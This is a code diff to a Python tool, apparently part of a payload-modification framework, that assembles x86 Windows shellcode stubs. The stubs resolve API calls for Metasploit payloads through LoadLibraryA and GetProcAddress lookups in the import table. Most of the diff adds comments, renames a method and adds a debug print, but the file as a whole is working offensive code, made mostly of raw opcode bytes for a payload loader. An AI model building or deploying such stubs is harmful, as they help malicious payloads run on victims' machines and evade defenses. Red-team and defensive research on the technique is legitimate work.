@@ -497,16 +497,16 @@ class x86_windows_metasploit:
             # findImport
             "\x8b\x57\x0c"                          # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
             "\x03\xd3"                              # add edx, ebx                          ;Offset in memory
-            # Update this for API-MS-WIN-CORE-LIBRARYLOADER-L1-2-0.DLL for win-7 ++
+            # Update put if statement here
             #'''
             #"\x81\x3a\x4b\x45\x52\x4e"              # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
             #"\x75\x09"                              # JE short 
             #"\x81\x7A\x04\x45\x4C\x33\x32"          # CMP DWORD PTR DS:[EDX+4],32334C45     ; el32
-            #"\x74\x05"                              # je 0x102f                             ;jmp saveBase
+            #"\x74\x05"                              # je 0x102f                             ; jmp saveBase
             #'''
-            "\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172 ; cp rary
+            "\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
             "\x75\x09"
-            "\x81\x7A\x18\x6F\x61\x64\x65"           # CMP DWORD PTR DS:[EDX+18],6564616F
+            "\x81\x7A\x18\x6F\x61\x64\x65"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp oade
             "\x74\x05"
 
             "\x83\xc7\x14"                          # add edi, 0x14                         ;inc to next import
@@ -632,6 +632,7 @@ class x86_windows_metasploit:
     ###############################    
 
     def get_hash(self, anumber):
+        sys.stderr.write("API HASH:{0}\n".format(anumber))
         for ahash in self.hashes:
             if hex(ahash[0]) == anumber:
                 self.called_apis.append(ahash[1])
@@ -647,7 +648,7 @@ class x86_windows_metasploit:
                 
         return None, None
 
-    def get_it_order(self):
+    def get_it_in_order(self):
         self.replace_string = b''
 
         if self.fewerapistub in self.code:
@@ -1155,8 +1156,6 @@ class x86_windows_metasploit:
         for api in string_set:
             self.string_table += api + "\x00"
 
-        
-
         self.string_table = bytes(self.string_table, 'iso-8859-1')
         # put the hashes and string table together "\x00\x00\x00\x00" denotes end of hashes 
         # XOR table here...
@@ -1188,67 +1187,55 @@ class x86_windows_metasploit:
         
         self.stub += self.lookup_table
         table_offset = len(self.stub) - len(self.lookup_table)
-        #TODO; Update the call below to point to the metasploit stub
-        self.stub += b"\x33\xC0"                     # XOR EAX,EAX
-        # OLD Stub to avoid calling lla/gpa... after testing not needed 
-        #self.stub += (
-        #                   b"\xBE\x4C\x77\x26\x07"         # MOV ESI,726774C
-        #                   b"\x3B\x74\x24\x24"             # CMP ESI,DWORD PTR SS:[ESP+24]
-        #                   b"\x74\x0B"                     # JE SHORT 001C0189
-        #                   b"\xBE\x49\xF7\x02\x78"         # MOV ESI,7802F749
-        #                   b"\x3B\x74\x24\x24"             # CMP ESI,DWORD PTR SS:[ESP+24]
-        #                   b"\x75\x02"                     # JNZ SHORT 001C018B
-        #                   b"\x61"                         # POPAD
-        #                   b"\xC3"                         # RETN
-        #                   )
-        #print("offset length", len(self.stub) - table_offset)
-
-        #self.stub += b"\x8B\x8E\x29\xFF\xFF\xFF"     # MOV ECX,DWORD PTR DS:[ESI-D7]
-        self.stub += b"\xE8\x00\x00\x00\x00"         # CALL 001C0190
-        self.stub += b"\x5E"                         # POP ESI
-                           
-        self.stub += b"\x8B\x8E"  # MOV ECX, ...
-        updated_offset = 0xFFFFFFFF - len(self.stub) - table_offset + 14
+        self.stub += b"\x33\xC0"                            # XOR EAX,EAX                    ; clear eax
+        self.stub += b"\xE8\x00\x00\x00\x00"                # CALL $+5                       ; get PC
+        self.stub += b"\x5E"                                # POP ESI                        ; current EIP loc in ESI                   
+        self.stub += b"\x8B\x8E"                            # MOV ECX, DWORD PTR [ESI+XX]    ; MOV 1st Hash into ECX
+        # updated offset
+        updated_offset = 0xFFFFFFFF - len(self.stub) - table_offset + 14 
+        # Check_hash
         self.stub += struct.pack("<I", 0xffffffff-len(self.stub) - table_offset + 14)
-        self.stub += b"\x3B\x4C\x24\x24"             # CMP ECX,DWORD PTR SS:[ESP+24]
-        self.stub += b"\x74\x05"                     # JNZ SHORT 001C0191
-        self.stub += b"\x83\xC6\x06"                 # ADD ESI,6
-        self.stub += b"\xEB\xEF"                     # JMP SHORT 001C0191
-        # FOUND A MATCH
-        self.stub += b'\x8B\x8E'                     # MOV ECX,DWORD PTR DS:[ESI-XX]
+        self.stub += b"\x3B\x4C\x24\x24"                    # CMP ECX,DWORD PTR SS:[ESP+24]  ; check if hash in lookup table
+        self.stub += b"\x74\x05"                            # JE SHORT 001C0191              ; if equal, to to found a match
+        self.stub += b"\x83\xC6\x06"                        # ADD ESI,6                      ; else increment to next hash
+        self.stub += b"\xEB\xEF"                            # JMP SHORT 001C0191             ; repeat
+        # FOUND_A_MATCH
+        self.stub += b'\x8B\x8E'                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; mov DLL offset to ECX
         self.stub += struct.pack("<I", updated_offset + 4)
-        self.stub += b"\x8A\xC1"                      # MOV AL,CL
-        # DOCUMENT
-        self.stub += b"\x8B\xCE"                           # MOV ECX,ESI
-        self.stub += b"\x03\xC8"                           # ADD ECX,EAX
-        self.stub += b"\x81\xE9"
-        self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff +3)) # SUB ECX,0EB
-        self.stub += b"\x51"                               # PUSH ECX
-        self.stub += b"\xFF\x13"                             # CALL DWORD PTR DS:[EBX]                  ; KERNEL32.LoadLibraryA
-        # DOCUMENT
-        self.stub += b"\x8B\xD0"                             # MOV EDX,EAX
-        self.stub += b"\x33\xC0"                             # XOR EAX,EAX
-        self.stub += b"\x8B\x8E"
-        self.stub += struct.pack("<I", updated_offset + 4)    # MOV ECX,DWORD PTR DS:[ESI-EB]
-        self.stub += b"\x8A\xC5"                                      # MOV AL,CH
-        self.stub += b"\x8B\xCE"                                      # MOV ECX,ESI
-        self.stub += b"\x03\xC8"                                      # ADD ECX,EAX
-        self.stub += b"\x81\xE9"                      # SUB ECX,0EB
+        self.stub += b"\x8A\xC1"                            # MOV AL,CL                      ; OFFSET in CL, mov to AL
+        # Get DLL and Call LLA for DLL Block
+        self.stub += b"\x8B\xCE"                            # MOV ECX,ESI                    ; mov offset to ecx
+        self.stub += b"\x03\xC8"                            # ADD ECX,EAX                    ; find DLL location
+        self.stub += b"\x81\xE9"                            # SUB ECX,XX                     ; normalize for ascii value
+        self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff +3))
+        self.stub += b"\x51"                                # PUSH ECX                       ; push on stack for use
+        self.stub += b"\xFF\x13"                            # CALL DWORD PTR DS:[EBX]        ; Call KERNEL32.LoadLibraryA (DLL)
+        # Get API and Call GPA
+        self.stub += b"\x8B\xD0"                            # MOV EDX,EAX                    ; Save DLL Handle to EDX
+        self.stub += b"\x33\xC0"                            # XOR EAX,EAX                    ; Prep EAX for use
+        self.stub += b"\x8B\x8E"                            # MOV ECX,DWORD PTR DS:[ESI-XX]  ; Put API Offset in ECX
+        self.stub += struct.pack("<I", updated_offset + 4)  
+        self.stub += b"\x8A\xC5"                            # MOV AL,CH                      ; mov API offset to ECX
+        self.stub += b"\x8B\xCE"                            # MOV ECX,ESI                    ; mov offset to ecx
+        self.stub += b"\x03\xC8"                            # ADD ECX,EAX                    ; find API location
+        self.stub += b"\x81\xE9"                            # SUB ECX,XX                     ; normalize for ascii value
         self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff + 4))
-        self.stub += b"\x51"                                          # PUSH ECX
-        self.stub += b"\x52"                                          # PUSH EDX
-        self.stub += b"\xFF\x55\x00"                                      # CALL DWORD PTR DS:[EDX]
-        self.stub += b"\x89\x44\x24\x1C"        # MOV DWORD PTR SS:[ESP+1C],EAX; SAVE EAX on popad in eax
-        self.stub += b"\x61"               # POPAD 
-        self.stub += b"\x5D"               # POP EBP ; get return addr
-        self.stub += b"\x59"               # POP ECX ; clear flag
-        self.stub += b"\xFF\xD0"             # CALL EAX                                 ; call target API
-        self.stub += b"\x55"                 # push ebp                                 ; push return addr
-        self.stub += b"\xe8\x00\x00\x00\x00"   # call next ; get pc
-        self.stub += b"\x5D"                    # POP EBP
-        self.stub += b"\x81\xED"
-        self.stub += struct.pack("<I", len(self.selected_payload)+ len(self.stub) -3)  #\xB9\x01\x00\x00"      #SUB EBP,1B9 to get the api call back
-        self.stub += b"\xC3"               # RETN
+        self.stub += b"\x51"                                # PUSH ECX                       ; Push API on the stack
+        self.stub += b"\x52"                                # PUSH EDX                       ; Push DLL handle on the stack
+        self.stub += b"\xFF\x55\x00"                        # CALL DWORD PTR DS:[EDX]        ; Call Getprocaddress(DLL.handle, API)
+        # Call API
+        self.stub += b"\x89\x44\x24\x1C"                    # MOV DWORD PTR SS:[ESP+1C],EAX  ; SAVE EAX for popad ends up in eax
+        self.stub += b"\x61"                                # POPAD                          ; Restore registers and call values
+        self.stub += b"\x5D"                                # POP EBP                        ; get return addr
+        self.stub += b"\x59"                                # POP ECX                        ; clear Hash API from msf caller 
+        self.stub += b"\xFF\xD0"                            # CALL EAX                       ; call target API
+        # Recover
+        self.stub += b"\x55"                                # push ebp                       ; push return addr into msf caller
+        self.stub += b"\xe8\x00\x00\x00\x00"                # call $+5                       ; get pc
+        self.stub += b"\x5D"                                # POP EBP                        ; current EIP in EBP
+        self.stub += b"\x81\xED"                            # SUB EBP,XX                     ; To reset the location of the api call back
+        self.stub += struct.pack("<I", len(self.selected_payload)+ len(self.stub) -3)   
+        self.stub += b"\xC3"                                # RETN                           ; return back into msf payload logic
 
 
         self.jump_stub = b"\xe8"
@@ -1270,7 +1257,7 @@ class x86_windows_metasploit:
         
 if __name__ == '__main__':
     test = x86_windows_metasploit(**vars(args))
-    test.get_it_order()
+    test.get_it_in_order()
     test.doit()
 
 
